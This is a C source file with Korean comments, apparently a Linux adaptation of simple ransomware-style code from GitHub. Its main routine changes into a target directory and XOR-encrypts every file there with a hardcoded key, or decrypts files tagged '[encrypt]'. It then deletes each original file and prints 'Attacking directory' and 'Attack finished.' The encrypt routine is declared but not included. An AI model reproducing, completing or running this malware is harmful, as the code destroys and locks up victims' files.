#include <stdio.h>
#include <string.h>
#include <dirent.h>  // <windows.h> 대신 Linux/UNIX 표준 헤더 사용
#include <limits.h>  // MAX_PATH 대신 PATH_MAX를 위해 포함
#include <unistd.h>  // chdir 함수를 위해 포함
#include <stdlib.h>  // exit 함수를 위해 포함

// MAX_PATH를 Linux의 PATH_MAX로 정의 (원본 코드 호환성)
#define MAX_PATH PATH_MAX
#define DIG 0

// --- (fcrypt, fdcrpt, new_file 함수는 여기에 있다고 가정합니다) ---
// 이 함수들은 원본 코드와 동일하게 둔다고 가정합니다.
int fcrypt(FILE *in, char *str, char *key);
int fdcrpt(FILE *in, char *str, char *key, int dig);
void new_file(char *str1, char *str2);
// void strok(char *str); // 이 함수는 더 이상 필요 없습니다.


/* * main 함수: ./red1 ./target 형식의 입력을 처리
 */
int main(int argc, char *argv[]) // main 함수가 인자를 받도록 수정
{
	FILE *in;
	DIR *dir;
	struct dirent *lsdir;
	char file[MAX_PATH];
	// char src[MAX_PATH]; // Windows 전용 코드 제거

	// 암호화 키는 그대로 사용
	char key[]={"Vª╣Ù#A*~#═¸Ù#3¢kéî¤F¾°sú▀wtèklsy±?Çd¤■7┴iß'üÆÍE©æ¬Ë╚░╝Øz?fFò"};

	// --- 1. Windows 전용 코드(GetModuleFileName)를 argv 처리로 변경 ---
	
	// 인자 개수 확인: ./red1 과 ./target 총 2개가 들어와야 함
	if (argc != 2) {
		// argv[0]는 실행 파일 이름입니다. (예: ./red1)
		fprintf(stderr, "Usage: %s <target_directory>\n", argv[0]);
		fprintf(stderr, "Example: %s ./target\n", argv[0]);
		exit(1); // 오류 종료
	}

	char *target_dir_path = argv[1]; // argv[1]이 "./target" 경로

	// --- 2. 원본 코드의 로직을 그대로 활용하는 가장 쉬운 방법 ---
	// chdir()을 사용해 아예 작업 디렉토리를 ./target 으로 이동합니다.
	// 이렇게 하면 원본 코드의 나머지 부분을 수정할 필요가 없습니다.
	if (chdir(target_dir_path) != 0) {
		perror("Error: Cannot change directory to target");
		exit(1);
	}

	// 3. 현재 디렉토리(".")를 엽니다. (현재 디렉토리는 ./target 입니다)
	dir = opendir(".");
	if (dir == NULL) {
		perror("Error: Cannot open target directory");
		exit(1);
	}

	printf("Attacking directory: %s\n", target_dir_path);

	// --- 4. 깃허브 코드의 탐색 및 암호화/복호화 로직 (거의 동일) ---
	while((lsdir=readdir(dir)) != NULL){

		// "." (현재 폴더)와 ".." (상위 폴더) 항목은 무시
		if (strcmp(lsdir->d_name, ".") == 0 || strcmp(lsdir->d_name, "..") == 0) {
			continue;
		}

		strcpy(file, lsdir->d_name);

		in = fopen(file, "rb");
			// fopen이 실패하면 (예: 하위 디렉토리인 경우) def로 점프
			if(in == NULL){goto def;} 

			// [encrypt] 표식이 있으면 복호화
			if(strstr(file, "[encrypt]") != NULL){
				fdcrpt(in, file, key, 0);
				goto def;
			}

		// 표식이 없으면 암호화
		fcrypt(in, file, key);

		def: 
			// goto로 점프하면 in이 NULL일 수도 있으므로 확인
			if (in != NULL) {
				fclose(in);
			}
			remove(file); // 원본 파일 삭제
	}

	closedir(dir);

	printf("Attack finished.\n");
	return 0;
}

int fdcrpt(FILE *in, char *str, char *key, int dig){

	int data, hash, i = dig; 
	char strx[MAX_PATH];

		new_file(str, strx);

	FILE *out = fopen(strx, "wb");

		while((data = getc(in)) != EOF){
			hash = ((data - sizeof(int)) ^ key[i]);
			putc(hash, out);
			i++;
			if (i >= strlen(key)){i = dig;}
		}

	fclose(out);

	printf("$: %s\t\tdecodificado\n", str);
return 0;
}

void new_file(char *str1, char *str2){

	int j = 0, i = 9;
		while(str1[i]!='\0'){
			str2[j] = str1[i];
			i++; j++;
		}

	str2[j] = '\0';
}